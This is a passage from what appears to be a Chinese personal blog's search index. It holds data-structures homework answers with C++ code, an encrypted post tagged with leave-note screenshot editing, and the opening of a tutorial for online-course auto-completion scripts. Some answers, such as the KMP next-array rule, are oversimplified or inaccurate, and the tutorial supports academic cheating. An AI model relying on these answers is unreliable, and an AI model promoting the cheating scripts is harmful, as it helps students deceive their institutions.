)。\n数组是一种线性结构\n数组是一种定长的线性结构\n除了插入与删除操作外，数组的基本操作还有存取、修改、检索和排序等\n数组的基本操作有存取、修改、检索和排序等，没有插入与删除操作\n\n关于数组，不正确的说法是：\n数组的基本操作有存取、修改、检索和排序等，没有插入与删除操作。\n实际上，数组是一种定长的线性结构，长度在创建时被固定。在插入和删除元素时，需要移动其他元素以保持数组的连续性，这会导致较高的时间复杂度。因此，数组的插入和删除操作相对效率较低。\n\n二、判断题31.稀疏矩阵压缩存储后，必会失去随机存取功能。\n正确\n错误\n\n稀疏矩阵压缩存储后，并不一定会失去随机存取功能。虽然压缩存储可能会限制某些随机存取功能，但这取决于具体的压缩算法和数据结构。例如，使用三元组表等压缩方式仍然可以支持随机存取功能，只是在稀疏矩阵中的零元素可能不会占据存储空间。因此，这个说法是不正确的。\n\n32.将数组称为随机存取结构是因为随时可以对数组进行存取访问。\n正确\n错误\n\n将数组称为随机存取结构是因为可以通过下标直接随机访问数组中的元素，因此说法是正确的。数组允许按照元素的索引进行快速访问，这意味着可以通过指定元素的索引位置来直接访问或修改元素的值。这种随机访问的特性使得数组成为一种支持高效随机访问的数据结构。\n\n33.有n个元素依次进栈，则出栈序列有(n-1)&#x2F;2种。\n正确\n错误\n\n这个说法是错误的。出栈序列的数量不一定是 (n-1)&#x2F;2。实际上，对于给定的n个元素，有许多不同的出栈序列可能。出栈序列的数量取决于具体的排列组合情况，而不是简单地等于 (n-1)&#x2F;2。具体的出栈序列数量需要根据出栈顺序的特定限制条件进行计算。\n\n34.栈可以作为实现过程调用的一种数据结构。\n正确\n错误\n\n栈可以作为实现过程调用的一种数据结构，因此这个说法是正确的。在程序执行过程中，当一个过程调用另一个过程时，会将返回地址、参数和局部变量等信息存储在栈中。这些信息以堆栈的形式保存，即后调用的函数压栈，先调用的函数出栈。栈的特点使得它非常适合用于实现过程调用和递归等计算机程序中。\n\n35.在栈满的情况下不能做进栈操作，否则将产生“上溢”。\n正确\n错误\n\n在栈满的情况下进行进栈操作将导致栈上溢，这会导致数据丢失或程序异常终止。因此，这个说法是正确的。栈有一个容量限制，当栈已满时，无法再进行进栈操作。如果强行进行进栈操作，将导致栈上溢（stack overflow），可能会损坏其他数据或引发程序异常。因此，在实现栈时，通常需要考虑栈上溢的情况并进行相应的处理。\n\n36.在循环队列中，front指向队头元素的前一个位置rear指向队尾元素的位置，则队满的条件是front&#x3D;rear。\n正确\n错误\n\n在循环队列中，通常采用取模运算来实现循环。front 指向队头元素的位置，rear 指向队尾元素的下一个位置。因此，队满的条件是 (rear + 1) % n == front，其中 n 是队列的最大容量。\n因此，说法是错误的。队满的条件不是 front = rear，而是 (rear + 1) % n == front。\n\n37.在单链表中，要取得某个元素，只要知道该元素所在结点的地址即可，因此单链表是随机存取结构。\n正确\n错误\n\n在单链表中，虽然可以通过知道该元素所在结点的地址来访问该元素，但这种访问方式并不属于随机存取，因为单链表不支持通过下标或索引直接访问元素。单链表只能通过从头结点开始逐个遍历查找的方式来找到指定位置的元素，这导致了访问的时间复杂度是 O(n)。因此，单链表并不属于随机存取结构。\n\n38.每种数据结构都具备三个基本操作：插入、删除和查找。\n正确\n错误\n\n这个说法是不准确的。尽管许多数据结构确实具有插入、删除和查找等基本操作，但并不是每种数据结构都具备这三种基本操作。不同类型的数据结构可能有不同的设计目标和特定的操作。有些数据结构可能只支持其中一些操作，而另一些数据结构可能具有不同的基本操作。因此，不能将每种数据结构都简单地归纳为具有这三个基本操作。\n\n39.线性结构的基本特征是：每个元素有且仅有一个直接前驱和一个直接后继。\n正确\n错误\n\n线性结构的基本特征是每个元素最多只有一个直接前驱和一个直接后继，而不是有且仅有一个。这意味着某些元素可以没有直接前驱或直接后继（比如第一个元素和最后一个元素）。因此，说法是错误的。\n\n40.算法的时间复杂度都要通过算法中的基本语句的执行次数来确定。\n正确\n错误\n\n这个说法是正确的。算法的时间复杂度是通过对算法中的基本语句执行次数的分析来确定的。基本语句通常是指算法中执行最频繁的操作，例如赋值语句、比较语句、算术运算等。通过计算基本语句执行的次数，可以得出算法的时间复杂度，从而评估算法的执行效率。\n\n三、简答题\n试解释数据结构、数据类型、抽象数据类型的概念\n\n\n数据结构：数据结构是计算机科学中一种特殊的方式，它可以使我们在计算机中更有效地存储和组织数据。例如，我们可以使用数组、链表、栈、队列、图和树等数据结构来存储和管理数据。\n数据类型：数据类型是编程语言中的一个概念，它定义了一组数据的值的集合和这组数据上可进行的操作。例如，整数类型（int）定义了整数的集合，我们可以对这些整数进行加法、减法、乘法和除法等操作。\n抽象数据类型（ADT）：抽象数据类型是一种逻辑描述，它定义了一组数据和在这组数据上可进行的操作，但并未指定这些操作的具体实现。例如，栈ADT定义了一组元素和两个基本操作：push（将元素添加到栈顶）和 pop（从栈顶移除元素）。然而，栈ADT并未指定这些操作应如何实现。我们可以使用数组或链表来实现栈ADT。\n\n\n以下为单链表在指定位置插入元素的 C++代码，请将划线处代码补充完整。以下是将划线处代码补充完整的 C++ 代码：\ntemplate &lt;typename DataType&gt;void LinkList&lt;DataType&gt;::Insert(int i, DataType x)&#123;    Node&lt;DataType&gt; *p = first, *s = nullptr;    int count = 0;    while (p != nullptr &amp;&amp; count &lt; i - 1) // (1) 划线处    &#123;        p = p-&gt;next;        count++;    &#125;    if (p == nullptr)        throw &quot;插入位置错误&quot;;    else    &#123;        s = new Node&lt;DataType&gt;(x);        s-&gt;next = p-&gt;next; // (2) 划线处        p-&gt;next = s; // (3) 划线处        if (p == last) // (4) 划线处            last = s;        length++; // (5) 划线处    &#125;&#125;\n\n在这段代码中：\n\n划线处 (1) 是 while 循环的条件，用于寻找指定位置的插入点。\n划线处 (2) 将新节点 s 的 next 指针指向 p 后面的节点。\n划线处 (3) 将 p 的 next 指针指向新节点 s。\n划线处 (4) 检查是否是在链表末尾插入，如果是，则更新 last 指针。\n划线处 (5) 增加链表的长度。\n\n\n如下为循环队列的实现代码，给出了类定义、构造函数、入队和出队函数，请 补充完整划线处代码。以下是补充完整划线处代码的实现：\nconst int QueueSize = 100;template &lt;typename DataType&gt;class CirQueue&#123;public:    CirQueue();    ~CirQueue();    void EnQueue(DataType x);    DataType DeQueue();    DataType GetHead();    int Empty();private:    DataType data[QueueSize];    int front, rear;&#125;;template &lt;typename DataType&gt;CirQueue&lt;DataType&gt;::CirQueue()&#123;    front = rear = 0; // (1) 划线处&#125;template &lt;typename DataType&gt;void CirQueue&lt;DataType&gt;::EnQueue(DataType x)&#123;    if ((rear + 1) % QueueSize == front) // (2) 划线处        throw &quot;队满，上溢出&quot;;    rear = (rear + 1) % QueueSize; // (3) 划线处    data[rear] = x;&#125;template &lt;typename DataType&gt;DataType CirQueue&lt;DataType&gt;::DeQueue()&#123;    if (front == rear) // (4) 划线处        throw &quot;下溢&quot;;    front = (front + 1) % QueueSize; // (5) 划线处    return data[front];&#125;\n\n在代码中：\n\n划线处 (1) 完成了循环队列的构造函数，将 front 和 rear 初始化为 0。\n划线处 (2) 是判断队列是否已满的条件。\n划线处 (3) 更新 rear 的位置，使其指向下一个入队元素应该存放的位置。\n划线处 (4) 是判断队列是否为空的条件。\n划线处 (5) 更新 front 的位置，使其指向下一个出队元素的位置。\n\n\n如下代码为顺序表和单链表的 C++类定义，请补充划线处缺失的代码，并对 含义进行注释。&lt;1&gt; 顺序表：\nconst int MaxSize = 100;template &lt;typename DataType&gt;class SeqList&#123;public:    SeqList();    SeqList(DataType a[], int n);    ~SeqList();    int Length();    int Empty();    void PrintList();    DataType Get(int i);    int Locate(DataType x);    void Insert(int i, DataType x);    DataType Delete(int i);private:    DataType data[MaxSize]; // (1) 顺序表的数据存储数组    int length; // (2) 顺序表的当前长度&#125;;\n\n&lt;2&gt; 单链表：\ntemplate &lt;typename DataType&gt;struct Node&#123;    DataType data; // (3) 节点中存储的数据    Node&lt;DataType&gt; *next; // (4) 指向下一个节点的指针&#125;;template &lt;typename DataType&gt;class LinkList&#123;public:    LinkList();    LinkList(DataType a[], int n);    ~LinkList();    void PrintList();    int Length();    DataType Get(int i);    int Locate(DataType x);    void Insert(int i, DataType x);    DataType Delete(int i);private:    Node&lt;DataType&gt; *first; // (5) 单链表的头指针&#125;;\n\n在代码中：\n\n划线处 (1) 是顺序表的数据存储数组。\n划线处 (2) 是顺序表的当前长度。\n划线处 (3) 是单链表节点中存储的数据。\n划线处 (4) 是指向下一个节点的指针。\n划线处 (5) 是单链表的头指针。\n\n\n以下为顺序栈的定义、初始化和压栈操作的实现，请补充完整划线部分代码。以下是补充完整划线部分代码的实现：\nconst int StackSize = 100;template &lt;typename DataType&gt;class SeqStack&#123;public:    SeqStack();    ~SeqStack();    void Push(DataType x);    DataType Pop();    DataType GetTop();private:    DataType data[StackSize]; // (1) 划线处    int top; // (2) 划线处&#125;;template &lt;typename DataType&gt;SeqStack&lt;DataType&gt;::SeqStack()&#123;    top = -1; // (3) 划线处&#125;template &lt;typename DataType&gt;void SeqStack&lt;DataType&gt;::Push(DataType x)&#123;    if (top == StackSize - 1) // (4) 划线处    &#123;        cout &lt;&lt; &quot;栈满&quot; &lt;&lt; endl;        throw &quot;上溢&quot;;    &#125;    top++; // (5) 划线处    data[top] = x;&#125;\n\n在代码中：\n\n划线处 (1) 定义了顺序栈的数据存储数组。\n划线处 (2) 定义了顺序栈的栈顶指针。\n划线处 (3) 是顺序栈的构造函数，初始化栈顶指针 top 为 -1。\n划线处 (4) 是判断栈是否已满的条件。\n划线处 (5) 是实现元素压栈操作，将栈顶指针 top 向上移动一个位置，并将元素 x 压入栈顶。\n\n\n设目标主串为 S&#x3D;“BBCABCDABABCDABD”，模式串为 T&#x3D;“ABCDABD”\n简述按 BF 算法对主串 S 进行模式匹配的过程; \n\n BF（Brute-Force）算法是一种简单直接的字符串匹配算法。其匹配过程为： 从主串 S 的第一个字符开始，依次和模式串 T 进行匹配。如果当前字符匹配成功，则继续比较下一个字符，直到模式串 T 完全匹配或者匹配失败。如果匹配失败，则将模式串向右移动一位，再次和主串进行匹配。这个过程会一直持续到找到匹配的子串或者主串遍历完毕。\n\n\n手工计算模式串 T 的 next 值; \n\n手工计算模式串 T 的 next 数组的过程如下：\nT &#x3D; “ABCDABD” \n首先，next[0] &#x3D; -1，next[1] &#x3D; 0（规定 next 数组下标从 0 开始）。\n依次计算 next 数组的值： \n对于第 i 个字符，如果 T[next[i]] &#x3D;&#x3D; T[i-1]，则 next[i+1] &#x3D; next[i] + 1； \n否则，将 next[i+1] 更新为 0。\n\n\n简述利用求得的 next 数组，按 KMP 算法对主串 S 进行模式匹配的过程。\n\n KMP 算法利用模式串 T 的 next 数组在匹配过程中避免不必要的回溯。匹配过程如下： 从主串 S 的第一个字符开始，同时从模式串 T 的第一个字符开始进行匹配。 如果当前字符匹配成功，则继续比较下一个字符。 如果匹配失败，根据 next 数组进行回溯操作，将模式串 T 向右移动相应的位数，使得模式串能够对齐主串中的下一个字符，继续匹配。 如果模式串完全匹配成功，则返回匹配的起始位置；否则，主串遍历完毕仍未找到匹配子串，则匹配失败。\n\n\n\n四、附加题请认真思考，谈一下你对数据结构课程的建议。（限 100 字以上，共 10 分）\n\n这题没什么好说的\n\n\n\n","categories":["学习笔记","数据结构作业","考试"],"tags":["数据结构作业"]},{"title":"这里什么也没有","url":"/posts/2d7b16cc.html","content":"\n\n  719a504c0cf791dd5cc47e0bd8194186397dfe5ab2d60cab0b6f485e5f24a9615ffc0130cf8eb21cbe0985874a2278d697fa62916b14e62507e03017d030687b174035d533a4a86f6b3cdf8a226c8d610c05c8d8ae2660d3000280a30d8eac594429471f19d9708deca941e816fbdaa57b26cd2b0cc782867e28740a2b855b10873f5ad53b47f4adbf59b77a13bf4d500b30dbdaafd93ee062df1e49b7b78752b2be8b34e57d9f423624588958b66f0266a94f11337c2ece630c02a9bf5daf8b2d3e76850bc0f160ecb3f7dc8e8eac2c5f5220fd728419e5ac4185364d6b4659fb3ae58abd56a961e8696946eefbe5c854a28e8303fa434ae9defd9cce48fc24f8def630c5a1f6452934b8875c1efc6de1487fa57f72bbbb7ef6959063d9ee9045b035a1d157ebb1ca5487476cf380e518c20609a56f2bfca58203907ceead3b44a198145f13a3f93e82d8719e5a21e899da96815f06ed80cd27eb256f691f1564684ca6c280fec19657acb36613ba2f6524621557fb508359884f793b358b75213f01a3c562c017f2e58fb0020cb4b51302e63f965c5f1b1e0693f2f145b059d09dc978c50075b8fff86a639cba588f234dca7c67f8454d63ce4c8345b446fbed59c3c39815f59cdb47b2e63c632c7bdc54ed959feb5f5e08e27bebbde2bb7b74f873302b87c0cfd73140563aca6737748e25030a0a2ddd72df895e5d4f1fcd53c33a6a02f7c62efe96abeaf92bff2388c5c3bd153a0a19c9baf7d1c4ac95e8a26d6152db8d4d9043f4c546c04e92fee31f031d2292297d71355075148f2981b467959869fec80a7d3a4cdac6911640d1300f7269964bb053021df060aa68184b55e2f086528f7ff3513eb65c57ac8164ee28dea96ccfcebb5ce257b75e244e8a395875a62814f49209c1cacd9b6d7f5a729e405a3671eef9f7f79de637f992ee4048476270556439b7ca37e840ab7c49de660f689e97180548a51a7b2a7d2ea0e0cde95bc8c15e0444e7d39b84eec2c01a37d572f1117b4c83144f7e0c0bd8a6bdea8652b30e9a12233303cfdd55733af57ba07a9b7bc947deff8ebfe86f2658a650a2ba89677952739365ea116edf60a1520d59107a60ceebdd809da7c6fc4a869c29477b7a7e767dd4e6e52a93348ccdab51a199a1985c003c1b69c4a3b6b70ff681646cb43837187cde9107d01c0fe833cfba7ed3f3ab37d38d06bf5a9c9942c1d4739fc50a03e5e52d5dace23b25f768bf8ff5cc000017ae33e36836c112b2ad6092693d4b0d3c3d7b568c0458f5758190c43622d12e5fe1e0f4e35616f307c35a7d91e5efdbd98e588230a0cdef74f5322971e42ea7f8c7fd970399f1184f39ff2cdbb07171e2e69ff0727a92e50b9d358af9e87a6c3a352f9da15a66c22644cfd446a30f92e8637c1370de1a0c828e2357a8cae2781013ca132a7ac62effd1cca4e5340d098d12a9c74c05674854e19d700dc8d0aeecd58c302043e28973c10baa323f984203442f87fbf0f3f176e17d257cde50f0155f12e2443f78274d82cbd2132af89a8376038572fdee39d9e66a5c2ec2d9cbb9568d95b5917b04d6fb37a767ddb63876c395218a3b8f74d3f8457f5ca46e40c2b6142e97f5d373de774b26117e32f7172abe53f297e4182834423881e5df9bd388822c3d087b4e7d0955b9c5c0b6b5fd2a37708b8416dda23e1cbd38be6ec0abb95e19f761e8834ba84ea4dc05c6176be3a2e40178217f9666baf4eba4d044c5e896b14fced757f60f88c7ed50f5e2ce11ef590cbe2db4c9ba6a45be9dfd493817026fff9cde376d53962bd01c0a6b1ad55db6172091541c97485812e22db51134d4e0328a87a4ef9496e2d5e0b222eb94ba9e668e375787642d14dec1e43d4ecf1a4738e065aa7865e68cac971204a6be6945d7c141ec1e3a04309c08eb9c5fcba894c24021586a7915dc7432cb67702448270ee2d6fd4254151e0ad7d82bb4a231f2ae9a847fad874d39bd9ec027ccd2f68bed511969a01332ce257b4e29d062ef4fa88ff7149df8402f3cb39e5c87a87b8d1c7a6357b95f436a0ed96c1681f6c86211738a89b010293f1507322a7121fb006a4ffee31886d632d5ea9fbeeff367ede9cbb5842c173b3f8d90f5dfceca411d1a2ef227c1bda472581127b6490e0fd5e8afe9f787782473faaa0ad8e4c72c4fc141d79af4c0ae57172822b5521a8bdf52c31aa7f76ecb84de4f1dfffb97170a33f763ecc95fff5ddc62c435e3b933bdfa09a16c5aedc50e7ab171fcf68a32a9c144b0c8aed6175a714f74a9ba173840340f8546714a7ea9366da2bab9412a086fa8a4b13025bb0ff9ed54187d74883f5df5e4a6eb3f23ef21c1bc981feff53cd421aeb431f45226d07fda1f2458acf104391c6723d506a5fb8549663186f41e231591cffc5be11a6997b3d9983325fd38ae674848a3f3969213f734c2c558dd3e292f663b6f793ddbdac89edd25916bf1ed84b1971937caf5c3625a8410d47131724114a0b78cdddac72162e7c7cf274aa561c105cac72a5f0937ee657ca3dfafccae8704e5a0b32b3e62a1c8f21460438ad666b44503c18c313cc72e110b859d1af10b661b7292b0b45efa3b22c00e3377a8a37b39e29578600c7ed270e18f162f279bd74ffb8614939a9fdc97d30865759816322a39f4df7fd32428a199e44e77dcecf9a4e69326ca3cd65ca6ba1ba02ba59d1eff2616d0bc6b9a2bcb3f2ba66662031d2284fd5d9227cf407f10002f9b79b3132097149a7013f435082b1b2518df4c1ccece58ce58bb61b2e07c0137006628c98da7b3c3f3d9885e080c59ac2998e8a217021c13a3a02037c110519c4f1e0004a5044ab68efc388b8af9c1e49043ba987ae460e051160af496f628407798b0c80a695440f6bf5152b35bbb262fa4ee96989c72bb582e6b0a76c813e246986b9ddda07c39976053e2538d355094c683d215e80e0adc21141c3948d75bfd21af04b075175adee12288412ccf1aaab9276f8c452f296bbe782365d904e8029d296683dd0dc9962dceb53a2d9c042728c44548dce6f0d270602075a11dd1730be5c479ad2164090bfeb26bed1504ed0044c6b9237ffcefe574dfa68d99ecd39070b3f4b2e95eb8960006012f5cfc489f52a431b59a52483ab354c918fe908f257e2e821899edb96880c96119ae3e0f4b892714ccac07e5117a3f546060a50fdd589b78f9753dff1f1e6a0dab0d9e17b4e9a72d1a30f5476df63c58cb098a61b722253ca49184e867d22ee6ed6b037db6559de42c117ded07ac78e25d98ab12d16f42db6e9e64ca74682500d3bd10ad65c30b6ea6578fa67e2fc34b5d3bb492ebabcb3a531d5ebc307230815c7a53ad5dd89e6844cdb983a6761571374baf739125f0e12e1f28d11f9266e9e3f94eed751e9e6c87be5bcb592e84422863c3057b996131c587a70ed0b260b1ea39d48a4ce073cf5d7339083069979ff0d435c12dd9d2a689be7944bfd5415248416b8dc26cbc6f9ffd65ee98838d4de4d74889d89099898b140b102fa3b76ea665d8670b35c624de44bb6972f7d0e3421c059a21db87d487cc4ce6eb4ecd3d82b320d77013ea697e48cc9a97dfd742a06661a6354a0820e1af135365cb32b544f096f9c33b9decb3a443864d4564748aa74a5f12e1890692e14b29a9fa53355ccf277625e74549b93787b97e971fb1cf9d93184c9eac497fb2ad09c777104ad330e4768113b1e7a082dc7cebf642aae68b8be5875f299bdb43754af84ba1d093b41766498584f22cfeb2d65235ebe09d82f9f1e54a6ba2b102077c49e6da8dc63a3c59219bc3454f543a2718c872933e0ba211cb4a0447565e9b46aa1be63bc43626fc692f4da3fb2cfbf4cc4f6ff646e3301a68ea882fb7dd1985487373cf875f6a1ef5e4c9be20f3a219ab5150181d6db840d458f3773457ecf73e55b42234a5ddc39fa746e0f63ea6de16597849574b02642aa4eeaeea89458255303ea68e6431eee0017ca390ddbd48f01996d02ed8487ba902c75270bd0b271e72d8de27ac71f02ef67b4a6d2372274da862857d2931e2d590f05118419edbf469e6cd566430d8d3b498a0ae9709a8a02967ff8a658fd9bcf6eb4af633525601594ee8ee9360c1d44aab25be9c6b2a519b00ad9afc484b4c335a6b34982dd4694ed1d280f8f3be4a528729441efd1e184d039df36fc6707d210e04c24690573f9c1bbdbce1840cc67304da3da087041a1c20f39dff87517641db8390e55691ad0414a7816310c0d4a3007c721d6d64bb46b403376fcd24846518e48e33eaee5ba3eeb8f08b5c3056851694fa40c4820154c4481a6fd59ff60054368ec5c1c715a9f1e9f2e92df8b0a15e98e20b8060bda1a045494cb3dcdf8db3ea0c5cddfdd1305d7887331521da4417634c03c63d1cf24bd13db16657a92890f25cfc869bb2cca0a1b172d95414b16713d46d725c412c435fbf03e7804658a8dbd9afb1f0f2c474a851c217d5e5829da9e1040107cbdc97dff38ce71a8afa74e1d4405d2bd1af5efbbde6491569f43053ddd1392dadd6e31b78ff51e62b8e3ec9744e2a2b36d9deb4ad5bea27aea8e657759000bd80706f2b740eac35614401dfebf90b9021cf9d5d5da05d3aa1f90d800fd17b28658c1bafc33e4f79b76fb0573ad156da45a56574ab624852e070f84bb1ba5b530409e483d171706ac9f72cd6271df5759be7c2736f65bf830e898559ea5b8f10a4e6f60ba65d4c0a31aeaba4f2d766080c43b4851addfb90c1d1153d26994eaa926d3240646a958e4b5426afde4e7faae7ab13c4b118b54b389a433e2e2a08a80cc24e083149989122568119c9e5e2c10c8cfff0ef200f37dd5492a8290dccac6bca3840eb1c155b6f9dfe3353e97c2875444c4844c484841c55d3962c8a60a959a1360cd18422c398e569af7e9c13de6a1ee3e2262b1767b6e54e87b39d12a40069a7c0776cb4f638053fc54e2db3a2e1b998c4e754a168730763cc985c1f35b957a627e17fac32912588ebc87f76fc2c70bda7268d39725993918ac76b7c27f7da9badf8de6f85b410b7b43af75aee2fe96d4b32d120ed0de25d79a2c8d04ffba19edea354de3e8e3f28ad08917d6a3274fd50c5787ee496b392967e2a46df604eb0c3d31469ffb4c0e60b154a94ae97402f4e3b38c08e201992503c3f8679574e04b87ac298fc5418b02981588c13618774aff162e1f24083515ae934ac857fb914072c8e276128200d777ffa3cbd5634014fadc4513dc3472c69020c6db2c6124a7a4f15f20520373a1789885d4c7f2184469a549d7f69f038dad1b722bbfd544b592eff9a56d1631a730bb57654f4f8da42796258278a0eadf402c3661e5506b1f21014083da8d6fce2a83c01c4b8926925f2bd4e322b34dce122f3e7bc2814e26b689f117ec7b0a2ecb658c154cec88b7df7445713755dbec9d2f9da1f25f7190a846573c7eabdea485ea952457c2377d7b6949f674f4500f8b85756788e7a1819c9e491877422bf3535528f9ed3516e3cb68e9664e7012729d40bbf1d1a7958f5005c103910d08d9701ae95084086f94c935ae0a2ee5f73f5569c2945ed860217fffa9381810004372c616e6d6fd31f8859dffdb8f04bec47deb551707e91c0fa11c90b64c8d3ff4eb8c69807014c45649e42781317cee3b1777491de4cc7b54691296f11c06a3abffab4507f239eec9a33432562325e50890aa8291126e6aefdd182f110b656ecd490bb58316d1b8dc81fbb133be503b73dea0e37213da141ac69075e153cfc5eee79c7b077853fb0d34f7ebd0a859345dd4eeadd42f5da6dbd6749286db64746187a5a542f303d57f9a04a13cc42cfabbca347c979111b18bc06d9db1f40d00fbad9d04d70bce82757cd0a32f220741f798c33198b55597633187701600a1643dbadec49150fc73d0ce23462e0aca4ad35794effb378067e6ea61f03b2e04510bb0359033e82e4616365aa3a0c9184c27b84e9214fd8a9925dd51785093c34dbac68860af0c897869c27df5e8ac7b4cfe4306408ddee2b282e82a94ae15f6e44505866e1f71bfe6693ed430278753f0b287c66e7295df97358d27a5d007b55a45afa460a7a09a42b650d0ae028036da2acb8d7a2afe26247f9c033dc9c0dc5f3d850e0b78ae8f1a4c869e61adf15c3caf4972a822ddb81555c2890004b9a20e4c9e28365251cc0c51a0840c1dc0b21935a69283bc23ccfc11ce3dac9d010a043cff44e59db46aa8452e90cc1fd44315c0c716be3704a381e67889dfc67e44fddc44025324e97b3c86a9072cc8ad6949f259a92c30937ca2a404ab85d56aacc4fe560b4fee0b21cf7965b6ff22777b5c65ebba1b941a72e1104b80e4b65ad4d5cb80cf8c594556baa35d11ac5237ea1583248adab29d432b171a38bc25f8e5d53a82649cfe66e7f74c838148d63397205b992b8b9439ce1174746b570c3a0567333b48aaf4e6b5452850ca13b4e89cd1f77c139f6cd347910520204a56f95f3c1f2f1b6ca0aa79521e791ebef50d90d71cf2ff4677519b11fac43d20692bacef9bdef1e5016620bb37112fe3f42e2be094d9b65202218453c92dc282917d781958cd04a5e984fb526fa1c297db133174f85c240b351bdca4ec7455c5350ae7f85303f87aeeaf16f547478d7a0d324ae5c55f9e91a91d0b469215dac2ad767b67370bc4e4d38e90a04c67cf647d5797c0c729d6f939d47ae226acf2726ca397e24086c27702f193fbe220b79d3087429fe7748dc47cbca063dc2bc4f87ff2c75b7369f9d7b0cb4a20f84e909a69c0eee72df288eef742e332f8b7b11a1c1ea5877d465b7aaff07478bfdcfda982bb26011450155065498462e093ef443ac26b2ed2d31be91555e66062f23804abcf7913827f60a9bac80ecc1b2f7d2bb26529243b9db0ab5d2f05a96d1a56a852e24f18d615643d16d83ac56ec0623479d4e7f7808426a22e157a42eec87d7b4d1780a5b91cf04453274ef13177beb1a280794f32a95bf06c95cc90268dbc7cb5e0f4c5a6eaf1f2ae2c44103c58a3c00de635561119149ead0960d04cfca94e9a1d63c55df0fbd533ef18f3098eebfb97a9a347205af6f1e5de57a8adcd2ea6569dc6b2d2a0021dd8f778f4f2d2f02f4962c96ec3b49d359add9d2818d0b452a0a527eb13b813363da36ec761a1fcc7e817a69ead0d318d6338dcf33661b7fa76d817ee1c857be00ebc2162e46aad91b3bdc455214544a21a2bfa9607a42c4b1c2a835dace9e5ffcbe00ce81793d05adf2038059922a97d69a756c9a9a2844da904b9b6485d1a13f5563e3cdaaf2d518da12858859be900d652cc1f50d94d87a86a0eb9d1ad06556dd8aa1d448576e22e74b98be69a831e5ab2cc134889d11e21884e611c7d46bcbd8d04af5de45ef166d1e748c5c0e2d03da97b4cfbed9529dc2630362b9b5a3e31ced928a4db4145132de66e8bb25110760300a12407c9460d549005eb545e17beed8b9a0b0cdb51bac0d0eb7e5ac0d2d6597ca9811ab8344b360950209f34e4cc83d3515783dd64e9208a310ae76832810b21880141eac34f0e8475878a0f01ebe938dc4b506a109bec4f5cbb0d0571e363c3a77a870caa89dcf37495436f70cf3d395da29fe280cc2e86884220ae253d988e8d8796e11ae756d2407e73449666c10f4108639dded785a340fb891a4569bce70d776fa215b74043c1beefa05d56ba9f2b0e2578b3294dd55917dedc3f1e9125aae56da0e181b9b831028f3b00ab9149b3a29d63e88c34cb1fd8e2f421395a18344f3af3f60411441d0add7e7d025511af2b2cb5555e98909c5c35a4be7f8b4fe9afa33038ba71d0278f3f7cad10946559bbd7490ec5433253450f59d6e95a20b7334d894128dc241ad3c705a22ba972cb20b29a45341ff63687cde8d773276774971feaa3eeee2e2fe098bb8a16a14eb5488b7694869bb1d780f848f58c3bac7762525e555776d97e4dbf4a535bd63bdeeebeeda921b0c85afddf6d8f99c41c986bbeb2cf71ad4d4c6544376c11066baf3eb0f3abf29a07fd77faeae5f53c38a9a3068c8412ea54c59d37ec6cc704542634843d86a5d8085d8e0fd550d833d530c5b73112b9f1f4c10a4241013fbf189ed528cb85c8dd0313ab31ea0ee35415ee2a9d4e069b81c91e2b610704b3214cba2f5190ef1378b979223d5760193c6b9587cbdcdc2de4cac5808f9d345f0196f7e23fe0b05c98f74bebc77c2726f07e5bf421970b300fd8d4e192fdc19c1c5477d2f685e866dfe898131a345102ef8ec1be09c5ed7d2870a6c09e5c5bb8ebae6ea88e850d902fccd62c6013ac521af5e87b129e7aa75d9553dfe052798e19501a6314c3d2bde1477e24d013f2ad9baaf6386983c68c40dc554f354d0c5b08ffb7ad20c36ceec2dbf4565097618ec83c9bd751fc80c0fe7b8eef2cf7c4e1e51de4c038446f1ecf51cbd27e3cfa59ee6bcfd92f6754ea92ad1d94116b434e39b7c12044de3bdaa9877c07786ad0cf636e2f2408f130e6ee633fb2205558fe395fec4705fbb6a587e2d161675e964c6474d2caf99a41ff1ed7aa13605046e2687acfcc7e65d84bbf9ebff3bde5647f7915d3364cf0a3705ef560345d2fc717a2db5855aac2050a9824c18b440f720e64e10c0caa36f9bed16ea23528e18598189680c9e05465e0c6bd94fe3613cc05493faf3fc6451f7d72c42441bc9c4bb18ab6185f31511d407d7bb64bfa03af9c4f8f18eaf396fb0de16110c739267bd0f7f30748cccf24a950d068daac30eaed761a8560fe59898cd6ba820a7038f1de0594e3eb8a92000266bcd666c76230a0ad5bffd6d12a1ec1a24af6d23f442dcd74391153f8d32e90bcaa4a6b618e325b9fc4c56752f0da5dbb034ae7fcd6d2f1cf639ffb4c03639655287ae33366f9a8df1d59a4d86b4586ae92c1424110cf396e14a3ee2398250b597fb76da588edb5c755e3c01af1f87fb49472e4601f567fee512a123c481970c133d9ec25b21020f4e211114039bc6f1b030981eaca9645760cd48d038fb7ed58da144d13b06192a1def4c4f035d68ef9ebfcee570a9b6d0cb41b351a0af9ee708f5d0cff52211d0b946f32ff157cc5bedd57d5ddf2de1c37ed8b0f85b09324f18d5c26ee8085b01f63d8dccdb6cfdff61a3519ccea2fd1470159c9606e47537bf\n  \n    \n      \n      \n        文章敏感特殊，特此加密，有需要请联系作者。\n      \n    \n  \n\n\n\nimport {initHBE} from \"/js/plugins/hbe.js\";\n  console.log(\"hexo-blog-encrypt: loaded.\");\n    initHBE();\n\n","categories":["技术教程"],"tags":["QFNU","假条","智慧曲园","截图","醒图","P图"]},{"title":"智慧树/知到/刷课脚本安装教程","url":"/posts/3af6ecf8.html","content":"\n新的刷课脚本已更新，强烈建议用新的，并把本脚本结合使用，效果最佳，传送门：https://blog.w1ndys.top/posts/1ff200e1\n\n\n前言：使用本工具请自觉遵守国家法律法规，下载后请 24 小时之内删除，本教程来自 www.w1ndys.top\n 使用  本教程即代表用户同意本教程 用户协议，使用本教程造成的  一切后果由个人承担 ， 作者   概不负责 \n 请注意：本教程所涉及脚本工具开发者并不是博主本人，内涵涉及收费的内容，请酌情考虑 \n本教程编写于 2023 年 11 月 3 日，距离时间过长可能脚本已失效，请铭记\n本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任\n\n本教程编写耗时  180 分钟  且浏览完全免费，且看且珍惜\n前期步骤基本和超星学习通的教程差不多\n作者建议建议在阳间的时间刷课，后台可以看到浏览时间的\n工具准备\n一台能上网的电脑\n\nGoogle Chrome（推荐）\n没有 Google 的可以用 Windows 自带的 Edge 浏览器（\n\n脚本猫（用篡改猴也行，本教程以脚本猫为例\n详情：脚本猫使用文档\n\n一个魔法工具（梯子）\n 需要特别注意的是，使用本工具有一定的流量计费，3.8-38.8 不等，根据自己需要选择 ，此费用也不是我本人收取，而是流量的提供方收取，特别注意这点  如果你介意此费用，你可以关闭此页面退出阅读了。  如果你自己有梯子可以忽略这一步  具体注意事项下面会提到\n\nOCS 